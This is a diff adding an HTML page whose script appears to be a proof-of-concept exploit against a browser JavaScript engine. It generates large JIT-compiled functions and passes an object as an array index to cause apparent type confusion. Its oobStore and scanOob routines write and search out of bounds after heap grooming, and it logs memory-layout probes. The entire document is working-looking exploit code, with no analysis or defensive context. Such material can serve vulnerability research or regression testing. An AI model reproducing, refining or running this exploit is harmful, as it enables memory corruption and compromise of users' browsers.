@@ -1,0 +1,75 @@
+<!doctype html>
+<meta charset="utf-8">
+<script>
+const idxObj = { marker: 0x41414141 };
+const marker = 0x51515151;
+// Local-only layout probe; ignored remotely unless --allow-natives-syntax is set.
+try { %DebugPrint(idxObj); } catch (_) {}
+
+const getIndexLines = ['function getIndex(x, arr, idx, limit) {'];
+for (let n = 0; n < 1100; n++) {
+  getIndexLines.push(`if (x === ${n}) return ${n};`);
+}
+getIndexLines.push('let result = 0;', 'let i = 0;', 'while (i < limit) {',
+                   'let a = i + 1;');
+for (let n = 0; n < 430; n++) {
+  getIndexLines.push(`a = (a + ${n}) | 0;`);
+}
+getIndexLines.push('result = arr[idx];', 'i++;', '}', 'return result;', '}',
+                   'return getIndex;');
+const getIndex = new Function(getIndexLines.join('\n'))();
+
+const storeLines = ['function oobStore(x, arr, idx, value, limit) {'];
+for (let n = 0; n < 1100; n++) {
+  storeLines.push(`if (x === ${n}) return ${n};`);
+}
+storeLines.push('let result = 0;', 'let i = 0;', 'while (i < limit) {',
+                 'let a = i + 1;');
+for (let n = 0; n < 430; n++) {
+  storeLines.push(`a = (a + ${n}) | 0;`);
+}
+storeLines.push('arr[idx] = value;', 'result += a & 1;', 'i++;', '}',
+                'return result;', '}', 'return oobStore;');
+const oobStore = new Function(storeLines.join('\n'))();
+
+const scanLines = ['function scanOob(x, arr, base, limit, wanted) {'];
+for (let n = 0; n < 1100; n++) {
+  scanLines.push(`if (x === ${n}) return ${n};`);
+}
+scanLines.push('let i = 0;', 'while (i < limit) {',
+               'let pos = (base + i) | 0;', 'let value = arr[pos];');
+scanLines.push('if (value === wanted) return i;', 'i++;', '}',
+               'return -1;', '}', 'return scanOob;');
+const scanOob = new Function(scanLines.join('\n'))();
+
+const N = 10_000_000;
+const calibration = new Array(N);
+for (let i = 0; i < N; i++) calibration[i] = i;
+console.log('direct', calibration[8675880], calibration.length);
+async function runProbe() {
+for (let i = 0; i < 15_000; i++) getIndex(2000, calibration, 0, 1);
+try { %DebugPrint(idxObj); } catch (_) {}
+await new Promise(resolve => setTimeout(resolve, 3000));
+const k = getIndex(2000, calibration, idxObj, 1);
+console.log('calibrated', typeof k, k, 'n', N);
+
+try {
+  const left = new Array(k);
+  left[0] = marker;
+  left.length = k + 0x1000000 + 2;
+  for (let i = 0; i < 15_000; i++) oobStore(2000, left, 0, marker, 1);
+  await new Promise(resolve => setTimeout(resolve, 3000));
+  const right = new Array(k);
+  right[0] = 0x13371337;
+  console.log('allocated', left.length, right.length, right[0]);
+  for (let i = 0; i < 15_000; i++) scanOob(2000, calibration, 0, 1, -1);
+  await new Promise(resolve => setTimeout(resolve, 3000));
+  const hit = scanOob(2000, left, k + 2, 0x1000000, right[0]);
+  console.log('scan', hit, 'absolute', hit < 0 ? -1 : k + 2 + hit,
+              typeof right[0], String(right[0]));
+} catch (e) {
+  console.log('caught', e && e.name, e && e.message);
+}
+}
+runProbe();
+</script>
